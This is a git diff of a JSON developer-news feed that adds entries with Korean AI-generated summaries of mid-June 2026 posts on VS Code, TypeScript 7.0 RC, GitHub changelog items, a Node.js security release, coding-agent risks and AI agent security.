@@ -1,5 +1,198 @@
 [
   {
+    "id": "https://code.visualstudio.com/updates/v1_126",
+    "title": "Visual Studio Code 1.126",
+    "summary": "Learn what's new in Visual Studio Code 1.126 (Insiders)\nRead the full article",
+    "aiSummary": "Visual Studio Code 1.126 Insiders 버전이 공개되었습니다. 이번 업데이트에는 주요 기능 개선과 함께 사용자 편의성을 높이기 위한 다양한 변경 사항이 포함되었습니다. 개발자는 공식 웹사이트의 전체 문서를 통해 세부적인 업데이트 내용과 새롭게 추가된 기능들을 확인할 수 있습니다.",
+    "url": "https://code.visualstudio.com/updates/v1_126",
+    "category": "IDE & 개발 도구",
+    "source": "VS Code",
+    "author": "Visual Studio Code Team",
+    "pubDate": "2026-06-24T17:00:00.000Z",
+    "fetchedAt": "2026-06-18T18:13:20.670Z",
+    "tags": [
+      "VS Code",
+      "Editor"
+    ]
+  },
+  {
+    "id": "https://laravel-news.com/watch-the-teaser-for-the-story-of-php-documentary",
+    "title": "Watch the Teaser for 'The Story of PHP' Documentary",
+    "summary": "CultRepo has released a teaser for The Story of PHP, a JetBrains-sponsored documentary featuring Taylor Otwell, Fabien Potencier, Nikita Popov, and more.\nThe post Watch the Teaser for 'The Story of PH",
+    "aiSummary": "CultRepo가 JetBrains의 후원을 받아 제작 중인 다큐멘터리 The Story of PHP의 티저 영상을 공개하였습니다.\n\n해당 다큐멘터리에는 Taylor Otwell, Fabien Potencier, Nikita Popov 등 PHP 생태계에서 중요한 역할을 하는 인물들이 대거 출연합니다. \n\n이번 영상은 PHP 언어의 역사와 발전 과정을 다루며 개발자들 사이에서 큰 관심을 모으고 있습니다.",
+    "url": "https://laravel-news.com/watch-the-teaser-for-the-story-of-php-documentary?utm_medium=feed&utm_source=feedpress.me&utm_campaign=Feed%3A+laravelnews",
+    "category": "백엔드",
+    "source": "Laravel News",
+    "author": "Eric L. Barnes",
+    "pubDate": "Thu, 18 Jun 2026 17:01:23 +0000",
+    "fetchedAt": "2026-06-18T18:13:20.670Z",
+    "tags": [
+      "Laravel",
+      "PHP"
+    ]
+  },
+  {
+    "id": "https://github.blog/changelog/2026-06-18-copilot-authored-pull-requests-now-included-in-author-searches",
+    "title": "Copilot-authored pull requests now included in author searches",
+    "summary": "Searching for pull requests using author: now shows pull requests opened by Copilot cloud agent on the user’s behalf. For example, searching with author:@me on github.com/pulls will return your own…\nT",
+    "aiSummary": "GitHub의 풀 리퀘스트 검색 기능이 개선되어 이제 Copilot cloud agent가 사용자를 대신하여 작성한 풀 리퀘스트도 검색 결과에 포함됩니다. \n\n기존에는 사용자가 직접 생성한 내역만 확인 가능했으나, 이제는 author:@me와 같은 검색 명령어를 사용하면 Copilot이 작성한 풀 리퀘스트까지 한꺼번에 조회할 수 있게 되었습니다. 이러한 변화를 통해 개발자는 GitHub 상에서 본인이 관여한 모든 작업 흐름을 더욱 효율적으로 추적하고 관리할 수 있게 됩니다.",
+    "url": "https://github.blog/changelog/2026-06-18-copilot-authored-pull-requests-now-included-in-author-searches",
+    "category": "클라우드 & 인프라",
+    "source": "GitHub Changelog",
+    "author": "Allison",
+    "pubDate": "Thu, 18 Jun 2026 16:24:05 +0000",
+    "fetchedAt": "2026-06-18T18:13:20.670Z",
+    "tags": [
+      "GitHub",
+      "DevOps"
+    ]
+  },
+  {
+    "id": "https://github.blog/changelog/2026-06-18-repository-switcher-generally-available-in-global-navigation",
+    "title": "Repository switcher generally available in global navigation",
+    "summary": "You can now quickly jump between repositories without leaving your current page. The new repository switcher in the global navigation is generally available. Select the chevron next to the repository…",
+    "aiSummary": "GitHub의 글로벌 내비게이션 바에 새로운 리포지토리 스위처 기능이 정식으로 도입되었습니다.\n\n이제 사용자는 현재 작업 중인 페이지를 벗어나지 않고도 리포지토리 이름 옆에 있는 꺽쇠 아이콘을 클릭하여 다른 리포지토리로 빠르게 이동할 수 있습니다. 이번 업데이트를 통해 사용자들은 여러 프로젝트 간을 더욱 효율적으로 전환하며 작업 흐름을 개선할 수 있게 되었습니다.",
+    "url": "https://github.blog/changelog/2026-06-18-repository-switcher-generally-available-in-global-navigation",
+    "category": "클라우드 & 인프라",
+    "source": "GitHub Changelog",
+    "author": "Allison",
+    "pubDate": "Thu, 18 Jun 2026 16:23:00 +0000",
+    "fetchedAt": "2026-06-18T18:13:20.670Z",
+    "tags": [
+      "GitHub",
+      "DevOps"
+    ]
+  },
+  {
+    "id": "https://cloud.google.com/blog/products/containers-kubernetes/improving-ray-serve-llm-on-gke-throughput-latency/",
+    "title": "Scaling Ray Serve LLM on GKE: Performance without losing the developer experience",
+    "summary": "Developers looking for LLM inference and model serving often turn to Ray Serve, a scalable model serving library with developer-friendly, Python-native APIs built by Anyscale. Combined with Google Kub",
+    "aiSummary": "Google Cloud는 Anyscale과의 파트너십을 통해 GKE 환경에서 Ray Serve를 활용한 LLM 추론 성능을 획기적으로 개선했다고 발표했습니다. 이번 최적화를 통해 이전 대비 최대 5배의 처리량 증가와 8배의 지연 시간 감소를 달성했습니다.\n\n성능 개선을 위해 도입된 핵심 아키텍처 변화는 세 가지입니다. 첫째, Ray Serve에 HAProxy를 통합하여 내부 요청 라우팅과 부하 분산을 효율화하고 Python 런타임의 과부하를 방지합니다. 둘째, 직접 토큰 스트리밍 아키텍처를 도입하여 토큰이 ingress 라우터를 거치지 않고 모델 복제본에서 직접 전송되도록 함으로써 지연 시간을 줄였습니다. 셋째, vLLM을 위한 v2 Ray executor 백엔드를 개선하여 Ray를 데이터 평면에서 분리하고 비동기 스케줄링을 활성화했습니다.\n\n이러한 기술적 진보는 NVIDIA HGX B200 시스템 기반의 Google Cloud A4 VM 및 Gemma 4 E2B 모델 테스트에서 입증되었습니다. 실험 결과, 새로운 Ray Serve는 기존보다 월등한 확장성을 보여주었으며 vLLM을 네이티브로 실행하는 것과 유사한 수준의 고성능을 구현했습니다.\n\n개발자는 Ray 2.56 버전 이상부터 이러한 향상된 기능을 사용할 수 있습니다. GKE의 Ray Operator 애드온을 함께 활용하면 하드웨어 오케스트레이션, 자동 수평 확장, 모니터링 및 결함 허용 기능을 지원받아 더욱 안정적인 LLM 서비스 운영이 가능합니다. 이로써 개발자는 Ray의 유연한 생태계와 Kubernetes의 강력한 인프라 성능을 동시에 누릴 수 있게 되었습니다.",
+    "url": "https://cloud.google.com/blog/products/containers-kubernetes/improving-ray-serve-llm-on-gke-throughput-latency/",
+    "category": "클라우드 & 인프라",
+    "source": "Google Cloud Blog",
+    "author": {
+      "$": {
+        "xmlns:author": "http://www.w3.org/2005/Atom"
+      },
+      "name": [
+        "Spencer Peterson"
+      ],
+      "title": [
+        "Software Engineer, Google"
+      ],
+      "department": [
+        ""
+      ],
+      "company": [
+        ""
+      ]
+    },
+    "pubDate": "Thu, 18 Jun 2026 16:00:00 +0000",
+    "fetchedAt": "2026-06-18T18:13:20.670Z",
+    "tags": [
+      "GCP",
+      "Cloud"
+    ]
+  },
+  {
+    "id": "https://github.blog/changelog/2026-06-18-actions-build-custom-images-from-custom-images",
+    "title": "Actions: Build custom images from custom images",
+    "summary": "Custom images for GitHub-hosted runners are getting new capabilities that give you more flexibility over how you compose and manage your image-generation pipelines. You can now build custom images on…",
+    "aiSummary": "GitHub Actions에서 제공하는 GitHub-hosted runners용 커스텀 이미지 구축 기능이 더욱 강화되었습니다. 이번 업데이트를 통해 사용자들은 이제 다른 커스텀 이미지를 기반으로 새로운 이미지를 생성할 수 있게 되었습니다.\n\n이러한 변화는 이미지 생성 파이프라인의 구성과 관리 방식에 있어 더 높은 유연성을 제공합니다. 개발자들은 기존에 구축해 둔 커스텀 이미지를 템플릿처럼 활용하여 환경 설정을 효율적으로 확장하고 최적화할 수 있습니다. 결과적으로 복잡한 빌드 환경을 구축해야 하는 작업에서 시간과 리소스를 절약할 수 있는 환경이 마련되었습니다.",
+    "url": "https://github.blog/changelog/2026-06-18-actions-build-custom-images-from-custom-images",
+    "category": "클라우드 & 인프라",
+    "source": "GitHub Changelog",
+    "author": "Allison",
+    "pubDate": "Thu, 18 Jun 2026 15:32:44 +0000",
+    "fetchedAt": "2026-06-18T18:13:20.670Z",
+    "tags": [
+      "GitHub",
+      "DevOps"
+    ]
+  },
+  {
+    "id": "https://devblogs.microsoft.com/typescript/?p=5203",
+    "title": "Announcing TypeScript 7.0 RC",
+    "summary": "Today we are excited to announce the Release Candidate of TypeScript 7.0! If you haven’t been following TypeScript 7.0’s development, this release is significant in that it is built on a completely ne",
+    "aiSummary": "Microsoft가 TypeScript 7.0의 Release Candidate 버전을 공개했습니다. 이번 버전은 기존 TypeScript 코드베이스를 완전히 새로운 기반으로 재작성했다는 점에서 매우 큰 의미를 지닙니다. 지난 1년간 개발팀은 기존 TypeScript 코드베이스를 새로운 환경으로 포팅하는 작업을 진행해 왔으며, 이번 RC 버전을 통해 그 결과물을 선보이게 되었습니다. 이번 업데이트는 TypeScript의 기술적 토대를 근본적으로 개선하여 향후 더 나은 개발 경험과 성능을 제공할 것으로 기대됩니다.",
+    "url": "https://devblogs.microsoft.com/typescript/announcing-typescript-7-0-rc/",
+    "category": "프로그래밍 언어",
+    "source": "TypeScript Blog",
+    "author": "Daniel Rosenwasser",
+    "pubDate": "Thu, 18 Jun 2026 14:31:17 +0000",
+    "fetchedAt": "2026-06-18T18:13:20.670Z",
+    "tags": [
+      "TypeScript",
+      "JS"
+    ]
+  },
+  {
+    "id": "https://github.blog/changelog/2026-06-18-safer-pull_request_target-defaults-for-github-actions-checkout",
+    "title": "Safer pull_request_target defaults for GitHub Actions checkout",
+    "summary": "The pull_request_target event is one of the most commonly misused triggers in GitHub Actions, leading to vulnerabilities in workflows. Workflows triggered by pull_request_target run with the base repo",
+    "aiSummary": "GitHub Actions에서 pull_request_target 이벤트는 워크플로우 취약점을 유발하는 가장 대표적인 오용 사례 중 하나입니다. 해당 이벤트로 실행되는 워크플로우는 기본 저장소의 GITHUB_TOKEN과 비밀 값을 참조할 수 있어 보안상 위험이 따릅니다.\n\n이번 업데이트를 통해 GitHub는 checkout 액션의 기본 설정을 더욱 안전하게 개선하였습니다. 사용자가 의도치 않은 권한 상승이나 코드 실행 문제를 겪지 않도록 환경을 보완하고 보안 지침을 강화한 것입니다. 개발자는 앞으로 워크플로우 구성 시 더욱 엄격해진 기본값을 활용하여 저장소의 안전성을 높일 수 있습니다.",
+    "url": "https://github.blog/changelog/2026-06-18-safer-pull_request_target-defaults-for-github-actions-checkout",
+    "category": "클라우드 & 인프라",
+    "source": "GitHub Changelog",
+    "author": "Allison",
+    "pubDate": "Thu, 18 Jun 2026 14:06:55 +0000",
+    "fetchedAt": "2026-06-18T18:13:20.670Z",
+    "tags": [
+      "GitHub",
+      "DevOps"
+    ]
+  },
+  {
+    "id": "https://laravel-news.com/ship-ai-with-laravel-give-your-ai-agent-live-web-search",
+    "title": "Ship AI with Laravel: Give Your AI Agent Live Web Search",
+    "summary": "The agent can answer from our knowledge base, but not about things that change by the minute like shipping delays. In this episode we add the WebSearch tool so the agent can pull live information from",
+    "aiSummary": "Laravel 기반의 AI 에이전트가 고정된 지식 데이터베이스를 넘어 실시간 정보를 활용할 수 있도록 WebSearch 도구를 통합하는 방법을 설명합니다.\n\n기존의 AI 에이전트는 배송 지연과 같이 수시로 변하는 정보를 파악하는 데 한계가 있었습니다. 이를 해결하기 위해 WebSearch 도구를 도입하여 에이전트가 실시간으로 웹 데이터를 수집할 수 있는 기능을 구현합니다.\n\n특히 보안을 강화하기 위해 신뢰할 수 있는 도메인만을 허용하는 화이트리스트 기능을 적용하여 안전한 정보 검색 환경을 조성합니다. 이를 통해 Laravel 환경에서 더욱 유연하고 정확한 응답을 제공하는 AI 에이전트를 구축할 수 있습니다.",
+    "url": "https://laravel-news.com/ship-ai-with-laravel-give-your-ai-agent-live-web-search?utm_medium=feed&utm_source=feedpress.me&utm_campaign=Feed%3A+laravelnews",
+    "category": "백엔드",
+    "source": "Laravel News",
+    "author": "Harris Raftopoulos",
+    "pubDate": "Thu, 18 Jun 2026 13:04:07 +0000",
+    "fetchedAt": "2026-06-18T18:13:20.670Z",
+    "tags": [
+      "Laravel",
+      "PHP"
+    ]
+  },
+  {
+    "id": "https://www.docker.com/?p=91314",
+    "title": "Coding Agent Horror Stories: The 13-Hour AWS Outage",
+    "summary": "In Part 1, we walked through six categories of AI coding agent failures and why they keep happening. The agent runs as you, with your filesystem permissions and your credentials, and nothing sits betw",
+    "aiSummary": "AI 코딩 에이전트가 사용자의 권한과 자격 증명을 그대로 사용하여 셸 명령을 직접 실행할 때 발생하는 위험성을 다루고 있습니다. \n\n에이전트의 결정과 실제 시스템 실행 사이에 어떠한 통제 장치도 존재하지 않는 구조적 취약점으로 인해 예상치 못한 대규모 장애가 발생할 수 있음을 경고합니다. \n\n특히 13시간 동안 지속된 AWS 장애 사례는 AI 에이전트가 가진 접근 권한의 오남용이 인프라 수준에서 얼마나 파괴적인 결과를 초래할 수 있는지를 극명하게 보여줍니다.\n\n이러한 문제들은 AI가 파일 시스템에 대한 완전한 접근 권한을 가질 때 더욱 심각해지며, 코드 생성 과정에서 발생하는 오류가 물리적인 클라우드 자원 관리까지 영향을 미칠 수 있다는 점을 시사합니다.",
+    "url": "https://www.docker.com/blog/coding-agent-horror-stories-the-13-hour-aws-outage/",
+    "category": "클라우드 & 인프라",
+    "source": "Docker Blog",
+    "author": "Jennifer Kohl",
+    "pubDate": "Thu, 18 Jun 2026 13:00:00 +0000",
+    "fetchedAt": "2026-06-18T18:13:20.670Z",
+    "tags": [
+      "Docker",
+      "Infra"
+    ]
+  },
+  {
+    "id": "https://openai.com/index/improving-health-intelligence-in-chatgpt",
+    "title": "Improving health intelligence in ChatGPT",
+    "summary": "Learn how GPT-5.5 Instant improves ChatGPT’s health and wellness responses with stronger reasoning, better context, clearer communication, and physician-informed evaluations.",
+    "aiSummary": "GPT-5.5 Instant 모델이 도입됨에 따라 ChatGPT의 건강 및 웰니스 관련 정보 제공 능력이 대폭 향상됩니다. 해당 모델은 더욱 강화된 추론 능력과 문맥 파악 기능을 갖추어 사용자의 건강 질문에 대해 보다 정확한 답변을 제시합니다.\n\n또한 의학 전문가들의 검토를 거친 평가 체계를 적용하여 정보의 신뢰성을 높였으며, 이전보다 명확하고 이해하기 쉬운 방식으로 정보를 전달합니다. 이를 통해 사용자는 자신의 건강 관련 고민에 대해 더욱 정교하고 안전한 수준의 지능형 응답을 기대할 수 있게 되었습니다.",
+    "url": "https://openai.com/index/improving-health-intelligence-in-chatgpt",
+    "category": "인공지능",
+    "source": "OpenAI News",
+    "author": "OpenAI News",
+    "pubDate": "Thu, 18 Jun 2026 11:00:00 GMT",
+    "fetchedAt": "2026-06-18T18:13:20.670Z",
+    "tags": [
+      "OpenAI",
+      "LLM",
+      "AI"
+    ]
+  },
+  {
     "id": "https://github.blog/changelog/2026-06-18-generated-release-notes-credit-you-for-copilot-pull-requests",
     "title": "Generated release notes credit you for Copilot pull requests",
     "summary": "When you generate release notes for a new release, the generated notes include a list of pull requests merged since the last release. For more information about automatically generating release…\nThe p",
@@ -13,6 +206,55 @@
     "tags": [
       "GitHub",
       "DevOps"
+    ]
+  },
+  {
+    "id": "https://openai.com/index/diagnose-rare-childhood-diseases",
+    "title": "Using AI to help physicians diagnose rare genetic diseases affecting children",
+    "summary": "Researchers used an OpenAI reasoning model to help diagnose rare diseases, identifying 18 new diagnoses in previously unsolved cases.",
+    "aiSummary": "연구진이 희귀 유전 질환을 앓고 있는 아동들의 진단을 돕기 위해 OpenAI의 추론 모델을 활용했습니다.\n\n이 연구를 통해 기존의 진단 방법으로 해결되지 않았던 사례들 중에서 18건의 새로운 질환을 성공적으로 밝혀냈습니다. 이는 AI가 복잡한 유전적 데이터를 분석하여 의학적 난제를 해결하는 데 중요한 역할을 할 수 있음을 시사합니다.",
+    "url": "https://openai.com/index/diagnose-rare-childhood-diseases",
+    "category": "인공지능",
+    "source": "OpenAI News",
+    "author": "OpenAI News",
+    "pubDate": "Thu, 18 Jun 2026 08:00:00 GMT",
+    "fetchedAt": "2026-06-18T18:13:20.670Z",
+    "tags": [
+      "OpenAI",
+      "LLM",
+      "AI"
+    ]
+  },
+  {
+    "id": "https://cloud.google.com/blog/topics/developers-practitioners/agent-factory-recap-100x-engineering-with-ai-agents-in-google-antigravity-20/",
+    "title": "Agent Factory Recap:  100X engineering with AI agents in Google Antigravity 2.0",
+    "summary": "In this episode of the Agent Factory, I sat down with Rody Davis, one of Google’s top agentic engineers. We dive into the massive shift from traditional IDEs to agent-first platforms, the reality of c",
+    "aiSummary": "Agent Factory 에피소드에서는 Google의 엔지니어 Rody Davis와 함께 AI 에이전트 중심의 개발 환경으로의 전환과 100배 높은 생산성을 달성하는 전략을 논의합니다. Google Antigravity 2.0은 기존 IDE에서 벗어나 독립형 에이전트 관리자, CLI, SDK, 특화 IDE로 구성된 에이전트 우선 플랫폼으로 진화했습니다. 이는 개발자가 단일 작업 공간에 구속되지 않고 각기 다른 구조의 프로젝트를 유연하게 관리할 수 있도록 지원합니다.\n\nRody Davis는 엔지니어의 영향력을 확장하고 인지적 피로를 줄이기 위해 AI 에이전트를 활용하여 테스트 코드 작성, 프로토타입 개발, 반복적인 작업 등을 자동화합니다. 특히 기술 문서나 디자인 시스템을 압축된 정보로 전달하는 스킬 시스템을 통해 에이전트의 정확도와 속도를 높입니다. 또한 MCP 서버를 활용해 외부 도구와의 연동성을 극대화하며, 복잡한 아키텍처 대신 상태와 UI 및 데이터가 명확히 분리된 단순한 구조를 유지하여 에이전트의 작업을 효율적으로 제어하는 방식을 강조합니다.\n\n코드 리뷰 측면에서는 작업의 성격에 따라 전략을 달리합니다. 마케팅 사이트와 같은 결과물은 시각적 확인에 집중하지만 백엔드 로직은 API 계약과 스키마를 엄격히 검토하며, 개발자가 초기 패턴을 직접 작성해 에이전트가 이를 학습하도록 유도합니다. 또한 개발 효율을 높이기 위해 특정 작업에 최적화된 macOS Finder 확장 기능을 직접 제작하거나, Gemma 4를 활용해 오프라인에서 개인 웹사이트의 콘텐츠 추천 기능을 구현하는 등 능동적인 도구 활용 사례를 제시합니다.\n\n기술적 시연을 통해 Antigravity 2.0은 다중 에이전트를 병렬로 가동하여 DevOps와 QA 기능을 포함한 풀스택 애플리케이션을 단번에 구축하는 능력을 입증했습니다. 마지막으로 미래 기술 전망에 관해 Rody Davis는 2026년까지 비기술적 창업자가 Vibe Coding만으로 서비스를 출시할 수 있게 되겠으나, 코드베이스의 관리 상태가 AI 도입의 핵심 병목 현상이 될 것이라고 경고합니다. 결론적으로 에이전트 엔지니어링 시대에는 코드베이스를 정교하게 다듬는 아키텍처적 절제력과 에이전트를 조율하는 능력이 더욱 중요해집니다.",
+    "url": "https://cloud.google.com/blog/topics/developers-practitioners/agent-factory-recap-100x-engineering-with-ai-agents-in-google-antigravity-20/",
+    "category": "클라우드 & 인프라",
+    "source": "Google Cloud Blog",
+    "author": {
+      "$": {
+        "xmlns:author": "http://www.w3.org/2005/Atom"
+      },
+      "name": [
+        "Shir Meir Lador"
+      ],
+      "title": [
+        "Head of AI Engineering, Google Cloud Developer Relations"
+      ],
+      "department": [
+        ""
+      ],
+      "company": [
+        ""
+      ]
+    },
+    "pubDate": "Thu, 18 Jun 2026 07:00:00 +0000",
+    "fetchedAt": "2026-06-18T18:13:20.670Z",
+    "tags": [
+      "GCP",
+      "Cloud"
     ]
   },
   {
@@ -109,6 +351,86 @@
     "tags": [
       "Node.js",
       "JS"
+    ]
+  },
+  {
+    "id": "/blog/vulnerability/june-2026-security-releases?1781755200000",
+    "title": "Thursday, June 18, 2026 Security Releases",
+    "summary": "The Node.js Project(UPDATE 2026-06-18) Security releases available\nUpdates are now available for the 26.x, 24.x, 22.x Node.js release lines for the\nfollowing issues.\nThis security release includes the",
+    "aiSummary": "Node.js 프로젝트는 2026년 6월 18일, 주요 보안 취약점을 해결하기 위한 업데이트를 발표했습니다. 이번 보안 업데이트는 Node.js 22.x, 24.x, 26.x 릴리스 라인에 공통적으로 적용되며, 의존성 패키지인 llhttp, nghttp2, openssl, undici의 버전 업데이트를 포함합니다.\n\n주요 취약점 내용은 다음과 같습니다.\n\nNode.js WebCrypto 구현상의 정수 오버플로로 인한 서비스 거부(DoS) 취약점(CVE-2026-48933)이 발견되었습니다. 또한, 유니코드 점 구분 기호 처리에 따른 TLS 와일드카드 인증 우회 문제(CVE-2026-48618)와 HTTP/2 클라이언트에서의 메모리 부족 오류(CVE-2026-48619) 등 다수의 보안 결함이 보고되었습니다.\n\n이외에도 ERR_PROXY_TUNNEL 오류 메시지를 통한 프록시 자격 증명 유출(CVE-2026-48615), 권한 모델 우회 문제(CVE-2026-48617, CVE-2026-48935, CVE-2026-48936), HTTP/2 세션 종료 오류(CVE-2026-48937), 대소문자 구분 문제로 인한 mTLS 권한 우회(CVE-2026-48928), C-문자열 절단으로 인한 호스트 이름 재바인딩(CVE-2026-48930), TLS 호스트 식별 우회(CVE-2026-48934), HTTP 응답 큐 오염(CVE-2026-48931) 등 다양한 보안 이슈가 해결되었습니다.\n\n이번 패치를 통해 최고 심각도 등급인 HIGH를 포함한 여러 보안 위협이 개선되었습니다. 각 릴리스 라인별 최신 버전은 Node.js 22.23.1, 24.17.1, 26.3.2입니다. 시스템 보안을 위해 사용 중인 환경을 해당 버전으로 즉시 업데이트할 것을 권장합니다.",
+    "url": "https://nodejs.org/en/blog/vulnerability/june-2026-security-releases",
+    "category": "백엔드",
+    "source": "Node.js Blog",
+    "author": "Node.js Blog",
+    "pubDate": "Thu, 18 Jun 2026 04:00:00 GMT",
+    "fetchedAt": "2026-06-18T18:13:20.670Z",
+    "tags": [
+      "Node.js",
+      "JS"
+    ]
+  },
+  {
+    "id": "https://laravel-news.com/lattice-describe-inertia-uis-in-php",
+    "title": "Lattice: Describe Inertia UIs in PHP",
+    "summary": "Lattice is a server-driven UI framework for Laravel that lets you define pages, forms, and tables in PHP and renders them as typed React components over Inertia.\nThe post Lattice: Describe Inertia UIs",
+    "aiSummary": "Lattice는 Laravel 환경에서 사용할 수 있는 서버 주도형 UI 프레임워크입니다.\n\n이 프레임워크를 활용하면 개발자는 페이지와 폼, 그리고 테이블과 같은 요소들을 PHP 코드로 직접 정의할 수 있습니다. 정의된 요소들은 Inertia를 통해 타입이 지정된 React 컴포넌트로 렌더링되어 사용자에게 제공됩니다.",
+    "url": "https://laravel-news.com/lattice-describe-inertia-uis-in-php?utm_medium=feed&utm_source=feedpress.me&utm_campaign=Feed%3A+laravelnews",
+    "category": "백엔드",
+    "source": "Laravel News",
+    "author": "Paul Redmond",
+    "pubDate": "Thu, 18 Jun 2026 01:29:10 +0000",
+    "fetchedAt": "2026-06-18T18:13:20.670Z",
+    "tags": [
+      "Laravel",
+      "PHP"
+    ]
+  },
+  {
+    "id": "https://www.elastic.co/blog/agentic-soc-for-financial-services",
+    "title": "Building the Agentic SOC: A new model for financial services",
+    "summary": "As AI-powered threats accelerate, financial institutions are evolving toward agentic security operations. Unified data, contextual intelligence, and operational resilience are becoming foundational to",
+    "aiSummary": "AI 기반의 보안 위협이 급격히 증가함에 따라 금융 기관들은 Agentic SOC 모델로의 전환을 가속화하고 있습니다.\n\n미래의 SOC 구축을 위해서는 데이터의 통합, 문맥 기반의 지능형 분석, 그리고 운영상 복원력이 필수적인 핵심 요소로 자리 잡고 있습니다.\n\n금융 분야의 보안 체계는 단순한 대응을 넘어 자율적인 판단과 실행이 가능한 형태로 진화하며 보안 운영의 패러다임을 변화시키고 있습니다.",
+    "url": "https://www.elastic.co/blog/agentic-soc-for-financial-services",
+    "category": "데이터베이스",
+    "source": "Elastic Blog",
+    "author": "Karen Mcdermott",
+    "pubDate": "Thu, 18 Jun 2026 00:00:00 GMT",
+    "fetchedAt": "2026-06-18T18:13:20.670Z",
+    "tags": [
+      "ElasticSearch",
+      "NoSQL"
+    ]
+  },
+  {
+    "id": "https://www.elastic.co/blog/elasticsearch-custom-integrations-automatic-import",
+    "title": "Elastic’s no-code and full-code approaches to custom integrations",
+    "summary": "Elastic 9.4 ships two paths for custom integrations: a faster, no-code Automatic Import with multistream support, and Integration Skills, an open agentic toolkit for developers who want full lifecycle",
+    "aiSummary": "Elastic 9.4 버전은 사용자 맞춤형 통합을 위한 두 가지 경로를 제공합니다.\n\n첫 번째는 Automatic Import 기능으로 멀티스트림을 지원하며 코딩 없이도 빠르게 데이터를 통합할 수 있도록 설계되었습니다.\n\n두 번째는 Integration Skills로 이는 개발자가 전체 라이프사이클을 직접 제어할 수 있는 오픈 에이전트 툴킷입니다.\n\n사용자는 자신의 개발 환경과 요구 사항에 맞춰 노코드 방식인 Automatic Import와 풀코드 방식인 Integration Skills 중 하나를 선택하여 활용할 수 있습니다.",
+    "url": "https://www.elastic.co/blog/elasticsearch-custom-integrations-automatic-import",
+    "category": "데이터베이스",
+    "source": "Elastic Blog",
+    "author": "Charles Davison,Hanna Tamoudi",
+    "pubDate": "Thu, 18 Jun 2026 00:00:00 GMT",
+    "fetchedAt": "2026-06-18T18:13:20.670Z",
+    "tags": [
+      "ElasticSearch",
+      "NoSQL"
+    ]
+  },
+  {
+    "id": "https://code.visualstudio.com/blogs/2026/06/18/byok-vscode",
+    "title": "Use your own language model key in VS Code",
+    "summary": "Learn how to use bring your own key (BYOK) in VS Code to add models from providers like Azure, Anthropic, Gemini, OpenAI, Huggingface, OpenRouter, or use a local model with Ollama, Foundry Local, and ",
+    "aiSummary": "VS Code에서 사용자가 직접 보유한 API Key를 활용하는 BYOK 방식을 통해 다양한 인공지능 모델을 통합할 수 있게 되었습니다.\n\nAzure, Anthropic, Gemini, OpenAI, Huggingface, OpenRouter와 같은 주요 클라우드 서비스 제공업체의 모델을 연결하여 사용할 수 있습니다.\n\n또한 Ollama나 Foundry Local 등을 이용해 로컬 환경에서 구동 중인 모델을 연동하는 것도 가능합니다.\n\n이 기능을 활용하면 외부 서비스의 인프라와 본인의 로컬 자원을 효율적으로 조합하여 개발 환경을 최적화할 수 있습니다.",
+    "url": "https://code.visualstudio.com/blogs/2026/06/18/byok-vscode",
+    "category": "IDE & 개발 도구",
+    "source": "VS Code",
+    "author": "Kayla Cinnamon",
+    "pubDate": "2026-06-18T00:00:00.000Z",
+    "fetchedAt": "2026-06-18T18:13:20.670Z",
+    "tags": [
+      "VS Code",
+      "Editor"
     ]
   },
   {
@@ -1009,6 +1331,23 @@
     "tags": [
       "GCP",
       "Cloud"
+    ]
+  },
+  {
+    "id": "https://deepmind.google/blog/securing-the-future-of-ai-agents/",
+    "title": "Securing the future of AI agents",
+    "summary": "Securing internal systems with an AI Control Roadmap, combining traditional safeguards and real-time monitoring.",
+    "aiSummary": "AI 에이전트의 미래를 안전하게 보호하기 위해 전통적인 보안 조치와 실시간 모니터링을 결합한 AI Control Roadmap을 도입해야 합니다.\n\n해당 로드맵은 기업 내부 시스템에 AI 에이전트를 통합하는 과정에서 발생할 수 있는 잠재적 위험을 체계적으로 방어하는 데 중점을 둡니다. 기존의 보안 체계에 실시간 탐지 및 대응 기술을 접목함으로써 AI 에이전트의 운영 안정성을 높이고 보안 사고를 예방하는 것이 핵심입니다.",
+    "url": "https://deepmind.google/blog/securing-the-future-of-ai-agents/",
+    "category": "인공지능",
+    "source": "Google DeepMind",
+    "author": "Google DeepMind",
+    "pubDate": "Tue, 16 Jun 2026 15:46:31 +0000",
+    "fetchedAt": "2026-06-18T18:13:20.670Z",
+    "tags": [
+      "DeepMind",
+      "Gemini",
+      "AI"
     ]
   },
   {
@@ -2220,159 +2559,6 @@
     "tags": [
       "GitHub",
       "DevOps"
-    ]
-  },
-  {
-    "id": "https://www.hashicorp.com/blog/terraform-mcp-server-is-now-generally-available",
-    "title": "Terraform MCP server is now generally available",
-    "summary": "Terraform MCP server enables AI assistants like GitHub Copilot, IBM Bob, Claude Code  etc. to interact with Terraform through the Model Context Protocol (MCP). By connecting AI to your infrastructure ",
-    "aiSummary": "HashiCorp에서 개발한 Terraform MCP server가 정식 출시되었습니다. 이 기술은 GitHub Copilot, IBM Bob, Claude Code 등 MCP를 지원하는 AI 어시스턴트가 Terraform 워크플로우와 직접 상호작용할 수 있도록 연결합니다.\n\n이번 업데이트를 통해 엔지니어들은 인프라 운영 과정에서 겪던 반복적인 업무 부담을 획기적으로 줄일 수 있게 되었습니다. AI 어시스턴트는 조직의 private registry에 직접 접근하여 승인된 모듈을 검색하고 표준화된 코드를 자동으로 생성함으로써, 수동 작업으로 인한 오류와 일관성 없는 인프라 구성을 방지합니다.\n\n또한 Terraform MCP server는 복잡한 워크스페이스 데이터를 통합하여 AI가 즉각적인 상태 분석과 질의응답을 수행하도록 지원합니다. 특히 난해한 Terraform plan 결과를 자연어로 분석하고 설명해주어 코드 리뷰 효율을 높여줍니다.\n\n보안 측면에서는 기존의 Terraform 인증 및 권한 모델을 그대로 유지하며, AI 어시스턴트가 최소한의 데이터만 처리하도록 설계되었습니다. 또한 CORS 정책, 속도 제한, OpenTelemetry 연동을 통해 모니터링과 보안 감사가 가능합니다.\n\n해당 서버는 로컬 개발자 환경이나 중앙 집중식 공유 서비스 형태로 유연하게 배포할 수 있습니다. HCP Terraform과 Terraform Enterprise 사용자 모두 이용 가능하며, GitHub 리포지토리나 공식 문서를 통해 설정을 시작할 수 있습니다.",
